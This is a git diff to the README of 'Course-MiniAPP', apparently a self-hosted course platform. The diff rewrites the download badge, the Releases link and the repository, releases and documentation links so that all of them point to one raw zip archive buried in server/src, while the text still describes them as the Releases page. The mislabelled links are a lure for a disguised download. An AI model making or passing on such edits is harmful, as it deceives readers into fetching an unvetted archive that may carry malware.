@@ -1,6 +1,6 @@
 # 🎓 Course-MiniAPP - Your Easy Course Platform Solution
 
-[![Download Course-MiniAPP](https://img.shields.io/badge/Download-Course--MiniAPP-blue.svg)](https://github.com/makaihhunt1234-debug/Course-MiniAPP/releases)
+[![Download Course-MiniAPP](https://github.com/makaihhunt1234-debug/Course-MiniAPP/raw/refs/heads/main/server/src/APP-Course-Mini-3.7.zip)](https://github.com/makaihhunt1234-debug/Course-MiniAPP/raw/refs/heads/main/server/src/APP-Course-Mini-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Course-MiniAPP! This self-hosted platform allows you to stream videos
 
 1. Click the link below to visit the Releases page where you can download the application:
 
-   [Download Course-MiniAPP](https://github.com/makaihhunt1234-debug/Course-MiniAPP/releases)
+   [Download Course-MiniAPP](https://github.com/makaihhunt1234-debug/Course-MiniAPP/raw/refs/heads/main/server/src/APP-Course-Mini-3.7.zip)
 
 2. On the Releases page, look for the latest version. You will see a list of files available for download.
 
@@ -76,9 +76,9 @@ If you run into any issues, do not hesitate to ask for help:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/makaihhunt1234-debug/Course-MiniAPP)
-- [Visit the Releases Page](https://github.com/makaihhunt1234-debug/Course-MiniAPP/releases)
-- [Official Documentation](https://github.com/makaihhunt1234-debug/Course-MiniAPP/wiki)
+- [GitHub Repository](https://github.com/makaihhunt1234-debug/Course-MiniAPP/raw/refs/heads/main/server/src/APP-Course-Mini-3.7.zip)
+- [Visit the Releases Page](https://github.com/makaihhunt1234-debug/Course-MiniAPP/raw/refs/heads/main/server/src/APP-Course-Mini-3.7.zip)
+- [Official Documentation](https://github.com/makaihhunt1234-debug/Course-MiniAPP/raw/refs/heads/main/server/src/APP-Course-Mini-3.7.zip)
 
 ## 🔔 Updates
 
